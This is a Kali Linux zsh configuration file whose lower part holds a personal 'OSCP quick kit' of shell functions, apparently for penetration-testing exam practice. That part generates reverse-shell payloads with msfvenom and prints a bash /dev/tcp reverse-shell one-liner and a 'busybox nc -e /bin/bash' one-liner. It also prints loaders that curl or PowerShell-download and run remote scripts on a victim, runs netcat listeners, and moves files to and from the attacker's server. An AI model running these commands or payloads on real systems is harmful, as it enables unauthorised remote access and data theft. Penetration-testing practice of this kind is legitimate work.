# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

setopt autocd              # change directory just by typing its name
#setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^U' backward-kill-line                   # ctrl + U
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

configure_prompt() {
    prompt_symbol=㉿
    # Skull emoji for root terminal
    #[ "$EUID" -eq 0 ] && prompt_symbol=💀
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
            # Right-side prompt with exit codes and background processes
            #RPROMPT=$'%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'
            ;;
        oneline)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
        backtrack)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n@%m%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
    esac
    unset prompt_symbol
}

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    configure_prompt

    # enable syntax-highlighting
    if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
        ZSH_HIGHLIGHT_STYLES[default]=none
        ZSH_HIGHLIGHT_STYLES[unknown-token]=underline
        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[path]=bold
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[assign]=none
        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
        ZSH_HIGHLIGHT_STYLES[named-fd]=none
        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
        ZSH_HIGHLIGHT_STYLES[arg0]=fg=cyan
        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%(#.#.$) '
fi
unset color_prompt force_color_prompt

toggle_oneline_prompt(){
    if [ "$PROMPT_ALTERNATIVE" = oneline ]; then
        PROMPT_ALTERNATIVE=twoline
    else
        PROMPT_ALTERNATIVE=oneline
    fi
    configure_prompt
    zle reset-prompt
}
zle -N toggle_oneline_prompt
bindkey ^P toggle_oneline_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%n@%m: %~\a'
    ;;
*)
    ;;
esac

precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$NEWLINE_BEFORE_PROMPT" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

    # Take advantage of $LS_COLORS for completion as well
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi


## Nico
# create enum directories
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
        cat extractPorts.tmp; rm extractPorts.tmp
}


########## OSCP quick kit (nico-style) ##########
# Auto LHOST: prioriza tun0 (VPN), si no eth0
nico.myip() {
  ip addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || ip addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || echo "127.0.0.1"
}

# Ruta al server temporal del repo
export nico_SRV="${HOME}/Scripts/oscp-aux/httpTempServ.py"

# 1) Servidor HTTP temporal con IP-substitution y SHORTCUTS (usa tun0 o IP pivot)
#    Uso: nico.srv [puerto] [ip_pivot]
#    Ejemplos:
#      nico.srv           # Puerto 80, IP de tun0
#      nico.srv 8080      # Puerto 8080, IP de tun0
#      nico.srv 5555 192.168.1.234  # Puerto 5555, IP pivot 192.168.1.234
nico.srv() {
  local port="${1:-80}"
  local pivot_ip="${2:-}"
  
  if [ -n "$pivot_ip" ]; then
    python3 "$nico_SRV" "$port" "$pivot_ip"
  else
    python3 "$nico_SRV" "$port"
  fi
}
# 2) Cargar scripts de recon en el objetivo (genera el one-liner con tu IP/puerto)
#    - Linux:  . <(curl http://IP:PUERTO/recon.sh)
#    - Windows: iex (New-Object Net.WebClient).DownloadString('http://IP:PUERTO/recon.ps1')
alias nico.loader.linux='echo ". <(curl http://$(nico.myip)/recon.sh)"'
alias nico.loader.win="echo \"powershell -ep bypass \n iex ((New-Object System.Net.WebClient).DownloadString('http://\$(nico.myip)/recon.ps1'))\""

# 3) Transferencias (usa POST/GET del server)
#    El server guarda con el nombre enviado en Content-Disposition
nico.up() { # nico.up <archivo> [remote-name]
  local f="$1"; local name="${2:-$(basename "$1")}"
  curl -sS -X POST \
    -H "Content-Disposition: attachment; filename=${name}" \
    --data-binary @"$f" "http://$(nico.myip)/" && echo "[+] Uploaded: $name"
}
nico.down() { # nico.down <ruta|shortcut> [out]
  local what="$1"; local out="$2"
  if [ -n "$out" ]; then
    curl -sS "http://$(nico.myip)/$what" -o "$out" && echo "[+] Saved to: $out"
  else
    curl -O "http://$(nico.myip)/$what" && echo "[+] Downloaded: $(basename "$what")"
  fi
}

# -----------------------------
# Netcat Listeners (con cheat)
# -----------------------------

# CheatSheet function
function nc_cheatsheet() {
  echo -e "\n---------------- CheatSheet ----------------"
  echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
  echo "[Ctrl+z]"
  echo "stty raw -echo; fg"
  echo "[Enter][Enter]"
  echo "export TERM=xterm; stty size cols 254 rows 54"
  echo "Si no hay python: script /dev/null -c bash"
  echo "export SHELL=bash"
  echo "--------------------------------------------"
  echo
}

# Listener fijo en 4444 con rlwrap
#alias nico.nc.win4444='rlwrap nc -nlvp 4444'
nico.nc.win4444() {
  local ip=$(nico.myip)
  echo "──────────────────────────────"
  echo "  🐉 Listener Windows revshell "
  echo "──────────────────────────────"
  echo "En la víctima (PowerShell):"
  echo "iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}/recon.ps1'))"
  echo "──────────────────────────────"
  echo "[*] Iniciando listener en 4444..."
  rlwrap nc -nlvp 4444
}

# Fallback: listener manual (puerto dinámico, sin rlwrap)
function nico.nc() {
  if [[ -z "$1" ]]; then
    echo "Uso: nico.nc <puerto>"
    return 1
  fi
  nc_cheatsheet
  nc -nlvp "$1"
}

# 5) msfvenom quickies (puerto opcional). Ej: nico.msf.win64 4444
nico.msf.win64() {
  local lhost="$(nico.myip)"; local lport="${1:-4444}"
  msfvenom -p windows/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o shell_x64.exe
}
nico.msf.win32() {
  local lhost="$(nico.myip)"; local lport="${1:-4444}"
  msfvenom -p windows/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o shell_x86.exe
}
nico.msf.lin64() {
  local lhost="$(nico.myip)"; local lport="${1:-443}"
  msfvenom -p linux/x64/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o shell_x64.elf
}

# 6) Shortcuts de binarios comunes (servidos por httpTempServ.py)
#    Estos comandos solo copian al docroot si prefieres apache; si usás httpTempServ, define SHORTCUTS en el .py
alias nico.send.mimikatz='echo "[*] Usa el shortcut /mm.exe en httpTempServ (config en SHORTCUTS del .py)"'
alias nico.send.reconps1='echo "[*] Usa /recon.ps1 (ya mapeado en SHORTCUTS del .py)"'
alias nico.send.reconsh='echo "[*] Usa /recon.sh (ya mapeado en SHORTCUTS del .py)"'

# 7) Quality of life
alias nico.pspy='echo "[*] En Linux objetivo: recon.pspy"'
alias nico.portscan='echo "Uso en Windows objetivo: recon.portscan <host> [1-1024]"'

# 8) MISC
# Bash reverse shell one-liner (auto tun0 IP, default port 4444)
nico.rev.bash() {
  local ip=$(nico.myip)
  local port="${1:-4444}"
  echo "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
  echo "busybox nc ${ip} ${port} -e /bin/bash"
}

# 9) nmap
# Nmap full TCP scan (IP obligatorio)
nico.nmap() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.nmap <IP>"
    return 1
  fi
  sudo nmap -p- -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" -oG "allPorts_${target}"
}

# Nmap UDP scan (IP obligatorio)
nico.nmap.udp() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.nmap.udp <IP>"
    return 1
  fi
  sudo nmap -sU -sS -sC -sV -oA "nmap.udp_${target}" "$target" -v
}

# nico.rust: fast discovery with real-time output + targeted nmap
nico.rust() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.rust <IP>"
    return 1
  fi
  
  # Set ulimit
  ulimit -n 5000 2>/dev/null || true
  
  echo "[*] Running rustscan on $target (real-time output)..."
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  # Run rustscan with real-time output (no capture, direct to stdout)
  # Save to temp file simultaneously using tee
  local tmpfile="/tmp/rs_${target}_$$"
  docker run --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 -a "$target" -b 1500 -t 500 -- -Pn 2>&1 | tee "$tmpfile"
  
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  # Extract ports from saved output
  ports=$(grep -oP '\b\d+(?=/tcp|\s+open\b)' "$tmpfile" | sort -un | tr '\n' ',' | sed 's/,$//')
  rm -f "$tmpfile"
  
  if [ -z "$ports" ]; then
    echo "[!] No ports detected — running full nmap scan"
    local out="allPorts_${target}_full_$(date +%Y%m%d_%H%M%S)"
    sudo nmap -p- -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" -oN "${out}.nmap" -oG "${out}.gnmap"
    return $?
  fi
  
  local out="allPorts_${target}_$(date +%Y%m%d_%H%M%S)"
  echo ""
  echo "[+] Detected ports: $ports"
  echo "[*] Running targeted nmap -> ${out}.nmap"
  echo ""
  
  # Run nmap with both -oN (normal) and -oG (greppable) for OSCP report
  sudo nmap -p"$ports" -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" \
    -oN "${out}.nmap" -oG "${out}.gnmap"
}

# nico.rust.slow: conservative scan for tunnels/VPN
nico.rust.slow() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.rust.slow <IP>"
    return 1
  fi
  
  ulimit -n 5000 2>/dev/null || true
  
  echo "[*] Running SLOW rustscan on $target (for tunnels/VPN)..."
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  local tmpfile="/tmp/rs_slow_${target}_$$"
  docker run --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 -a "$target" -b 200 -t 2000 -- -Pn 2>&1 | tee "$tmpfile"
  
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  ports=$(grep -oP '\b\d+(?=/tcp|\s+open\b)' "$tmpfile" | sort -un | tr '\n' ',' | sed 's/,$//')
  rm -f "$tmpfile"
  
  if [ -z "$ports" ]; then
    echo "[!] No ports detected — running conservative full scan"
    local out="allPorts_${target}_full_slow_$(date +%Y%m%d_%H%M%S)"
    # Slower full scan for unstable connections
    sudo nmap -p- -sS -sCV --min-rate 1000 -vvv -n -Pn "$target" -oN "${out}.nmap" -oG "${out}.gnmap"
    return $?
  fi
  
  local out="allPorts_${target}_slow_$(date +%Y%m%d_%H%M%S)"
  echo ""
  echo "[+] Detected ports: $ports"
  echo "[*] Running targeted nmap (slower) -> ${out}.nmap"
  echo ""
  
  sudo nmap -p"$ports" -sS -sCV --min-rate 1000 -vvv -n -Pn "$target" \
    -oN "${out}.nmap" -oG "${out}.gnmap"
}


########## end ##########

# Banner
nico.banner() {
cat <<'EOF'
──────────────────────────────
    🐉 NICO OSCP QUICK KIT 🐉
──────────────────────────────
Server:
  nico.srv [port]          → Start HTTP server (SHORTCUTS: /recon.ps1 /recon.sh /mm.exe /nc.exe ...)
  nico.srv [port] [pivot]  → Start HTTP server for Pivot
Loaders:
  nico.loader.linux        → Bash one-liner to load recon.sh
  nico.loader.win          → PS one-liner to load recon.ps1
Transfers:
  nico.up f [name]         → Upload file to server
  nico.down path [o]       → Download (supports shortcuts)
Shells:
  nico.nc                  → Netcat listener (nc pelado)
  nico.nc.win4444          → Netcat listener 4444 (rlwrap)
Payloads:
  nico.msf.win64 p         → Win x64 rev shell
  nico.msf.win32 p         → Win x86 rev shell
  nico.msf.lin64 p         → Linux x64 rev shell
Revs:
  nico.rev.bash            → Bash rev shell "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"

Scanning:
  nico.nmap                → Full TCP scan (-p- -sS -sCV --min-rate 5000 ...)
  nico.nmap.udp            → UDP scan (-sU -sS -sC -sV -oA nmap.udp)
  nico.rust <IP>           → RustScan discovery → sudo nmap (-sS -sCV) [no overwrite]
  nico.rust.slow <IP>      → Igual que arriba pero túneles (batch bajo/timeout alto)
  rustscan <IP> -- -sV -sC → One-liner: discovery + nmap directo (rápido)

AutoRecon:
  nico.autorecon IP -o ~/obsidian   → Full AutoRecon (incluye plugins long)
  nico.autorecon.short              → AutoRecon rápido (excluye plugins long)

Banner:
  nico.banner | nico.cheat  → Print this banner
──────────────────────────────
EOF
}

nico.banner
########## END ##########

# cheat sheet
alias nico.cheat=nico.banner

# Created by `pipx` on 2024-12-14 17:18:39
export PATH="$PATH:/home/kali/.local/bin"

# Autorecon
#nico.autorecon='sudo $(which autorecon) -vv'
#nico.autorecon.short='sudo $(which autorecon)  -vv --exclude-tags="long"'
#alias autorecon='sudo env "PATH=$PATH" autorecon'
# Autorecon (larga)
nico.autorecon() {
  sudo $(which autorecon) -vv "$@"
}

# Autorecon (corta, sin long)
nico.autorecon.short() {
  sudo $(which autorecon) -vv --exclude-tags="long" "$@"
}


#alias nxc='sudo docker run --rm -it -v $(pwd):/data parrotsec/netexec:6 nxc'

#alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.3.0'

# Wrapper docker: ajusta ulimit dentro del contenedor y pasa args
rustscan() {
  # opcional: intentamos subir soft limit en host (sirve para nmap local u otros procesos)
  ulimit -n 5000 2>/dev/null || true

  # Ejecuta el contenedor y establece nofile en container (soft:hard)
  docker run -it --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 "$@"
}



# Keys ES
setxkbmap -layout es

#  Target global
[ -f ~/.targetrc ] && source ~/.targetrc
export PATH="$HOME/.local/bin:$PATH"
